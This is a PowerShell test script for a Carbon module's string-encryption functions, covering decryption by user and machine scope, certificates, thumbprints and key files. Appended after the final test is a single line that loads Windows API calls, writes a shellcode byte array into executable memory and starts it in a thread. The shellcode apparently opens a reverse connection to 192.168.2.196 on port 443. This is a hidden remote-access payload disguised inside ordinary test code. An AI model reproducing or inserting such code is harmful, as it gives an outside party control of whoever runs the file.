











$originalText = $null
$protectedText = $null
$secret = [Guid]::NewGuid().ToString()
$rsaCipherText = $null
$publicKeyPath = Join-Path -Path $PSScriptRoot -ChildPath 'CarbonTestPublicKey.cer' -Resolve
$privateKeyPath = Join-Path -Path $PSScriptRoot -ChildPath 'CarbonTestPrivateKey.pfx' -Resolve
$dsaKeyPath = Join-Path -Path $PSScriptRoot -ChildPath 'CarbonTestDsaKey.cer' -Resolve

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot '..\Initialize-CarbonTest.ps1' -Resolve)

    $rsaCipherText = Protect-String -String $secret -PublicKeyPath $privateKeyPath
}

function Start-Test
{
    $originalText = [Guid]::NewGuid().ToString()
    $protectedText = Protect-String -String $originalText -ForUser
}

function Test-ShouldUnprotectString
{
    $actualText = Unprotect-String -ProtectedString $protectedText
    Assert-Equal $originalText $actualText "String not decrypted."
}


function Test-ShouldUnprotectStringFromMachineScope
{
    $secret = Protect-String -String 'Hello World' -ForComputer
    $machine = Unprotect-String -ProtectedString $secret
    Assert-Equal 'Hello World' $machine 'decrypting from local machine scope failed'
}

function Test-ShouldUnprotectStringFromUserScope
{
    $secret = Protect-String -String 'Hello World' -ForUser
    $machine = Unprotect-String -ProtectedString $secret
    Assert-Equal 'Hello World' $machine 'decrypting from user scope failed'
}


function Test-ShouldUnrotectStringsInPipeline
{
    $secrets = @('Foo','Fizz','Buzz','Bar') | Protect-String -ForUser | Unprotect-String 
    Assert-Equal 'Foo' $secrets[0] 'Didn''t decrypt first item in pipeline'
    Assert-Equal 'Fizz' $secrets[1] 'Didn''t decrypt first item in pipeline'
    Assert-Equal 'Buzz' $secrets[2] 'Didn''t decrypt first item in pipeline'
    Assert-Equal 'Bar' $secrets[3] 'Didn''t decrypt first item in pipeline'
}

function Test-ShouldLoadCertificateFromFile
{
    $revealedSecret = Unprotect-String -ProtectedString $rsaCipherText -PrivateKeyPath $privateKeyPath
    Assert-NoError
    Assert-Equal $secret $revealedSecret
}

function Test-ShouldHandleMissingPrivateKey
{
    $revealedSecret = Unprotect-String -ProtectedString $rsaCipherText -PrivateKeyPath $publicKeyPath -ErrorAction SilentlyContinue
    Assert-Error -Last -Regex 'doesn''t have a private key'
    Assert-Null $revealedSecret
}


function Ignore-ShouldHandleNonRsaKey
{
    $revealedSecret = Unprotect-String -ProtectedString $rsaCipherText -PrivateKeyPath $dsaKeyPath
    Assert-Error -Last -Regex 'not an RSA key'
    Assert-Null $revealedSecret
}


function Ignore-ShouldHandleCiphertextThatIsTooLong
{
    $cert = Get-Certificate -Path $privateKeyPath
    $secret = 'f' * 471
    
    $ciphertext = Protect-String -String $secret -Certificate $cert
    Assert-NoError
    Assert-NotNull $ciphertext
    Assert-Null (Unprotect-String -ProtectedString $ciphertext -Certificate $cert -ErrorAction SilentlyContinue)
    Assert-Error -Last -Regex 'too long'
}

function Test-ShouldLoadPasswordProtectedPrivateKey
{
    $keyPath = Join-Path -Path $PSScriptRoot -ChildPath 'CarbonTestPublicKey2.cer' -Resolve
    $ciphertext = Protect-String -String $secret -PublicKeyPath $keyPath

    $keyPath = Join-Path -Path $PSScriptRoot -ChildPath 'CarbonTestPrivateKey2.pfx' -Resolve
    $revealedText = Unprotect-String -ProtectedString $ciphertext -PrivateKeyPath $keyPath -Password 'fubar'
    Assert-NoError 
    Assert-Equal $secret $revealedText
}

function Test-ShouldDecryptWithDifferentPaddingFlag
{
    $revealedText = Unprotect-String -ProtectedString $rsaCipherText -PrivateKeyPath $privateKeyPath -UseDirectEncryptionPadding -ErrorAction SilentlyContinue
    Assert-Error -Last -Regex 'padding algorithm'
    Assert-Null $revealedText
}

function Test-ShouldHandleUnencryptedString
{
    $stringBytes = [Text.Encoding]::UTF8.GetBytes( 'fubar' )
    $mySecret = [Convert]::ToBase64String( $stringBytes )
    $result = Unprotect-String -ProtectedString $mySecret -PrivateKeyPath $privateKeyPath -ErrorAction SilentlyContinue
    Assert-Error -Last -Regex 'different key'
    Assert-Null $result
}

function Test-ShouldHandleEncryptedByDifferentKey
{
    $ciphertext = Protect-String -String 'fubar' -PublicKeyPath (Join-Path -Path $PSScriptRoot -ChildPath 'CarbonTestPublicKey2.cer' -Resolve)
    $result = Unprotect-String -ProtectedString $ciphertext -PrivateKeyPath $privateKeyPath -ErrorAction SilentlyContinue
    Assert-Error -Last -Regex 'isn''t encrypted'
    Assert-Null $result
}

function Test-ShouldDecryptWithCertificate
{
    $cert = Get-Certificate -Path $privateKeyPath
    $revealedSecret = Unprotect-String -ProtectedString $rsaCipherText -Certificate $cert
    Assert-NoError
    Assert-Equal $secret $revealedSecret
}

function Test-ShouldDecryptWithThumbprint
{
    $cert = Install-Certificate -Path $privateKeyPath -StoreLocation CurrentUser -StoreName My
    try
    {
        $revealedSecret = Unprotect-String -ProtectedString $rsaCipherText -Thumbprint $cert.Thumbprint
        Assert-NoError
        Assert-Equal $secret $revealedSecret
    }
    finally
    {
        Uninstall-Certificate -Thumbprint $cert.Thumbprint -StoreLocation CurrentUser -StoreName My
    }
}

function Test-ShouldHandleInvalidThumbprint
{
    $revealedSecret = Unprotect-String -ProtectedString $rsaCipherText -Thumbprint ('1' * 40) -ErrorAction SilentlyContinue
    Assert-Error -Last -Regex 'not found'
    Assert-Null $revealedSecret
}

function Test-ShouldHandleThumbprintToCertWithNoPrivateKey
{
    $cert = Get-ChildItem -Path 'cert:\*\*' -Recurse | 
                Where-Object { $_.PublicKey.Key -is [Security.Cryptography.RSACryptoServiceProvider] } |
                Where-Object { -not $_.HasPrivateKey } |
                Select-Object -First 1
    Assert-NotNull $cert
    $revealedSecret = Unprotect-String -ProtectedString $rsaCipherText -Thumbprint $cert.Thumbprint -ErrorAction SilentlyContinue
    Assert-Error -Last -Regex 'doesn''t have a private key'
    Assert-Null $revealedSecret
}

function Test-ShouldDecryptWithPathToCertInStore
{
    $cert = Install-Certificate -Path $privateKeyPath -StoreLocation CurrentUser -StoreName My
    try
    {
        $revealedSecret = Unprotect-String -ProtectedString $rsaCipherText -PrivateKeyPath ('cert:\CurrentUser\My\{0}' -f $cert.Thumbprint)
        Assert-NoError
        Assert-Equal $secret $revealedSecret
    }
    finally
    {
        Uninstall-Certificate -Thumbprint $cert.Thumbprint -StoreLocation CurrentUser -StoreName My
    }
}

function Test-ShouldHandlePathNotFound
{
    $revealedSecret = Unprotect-String -ProtectedString $rsaCipherText -PrivateKeyPath 'C:\fubar.cer' -ErrorAction SilentlyContinue
    Assert-Error -Last -Regex 'not found'
    Assert-Null $revealedSecret
}

function Test-ShouldConvertToSecureString
{
    [securestring]$secureSecret = Unprotect-String -ProtectedString $protectedText -AsSecureString 
    Assert-Is $secureSecret ([securestring])
    Assert-Equal $originalText (Convert-SecureStringToString -SecureString $secureSecret)
    Assert-True $secureSecret.IsReadOnly()
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0xc4,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

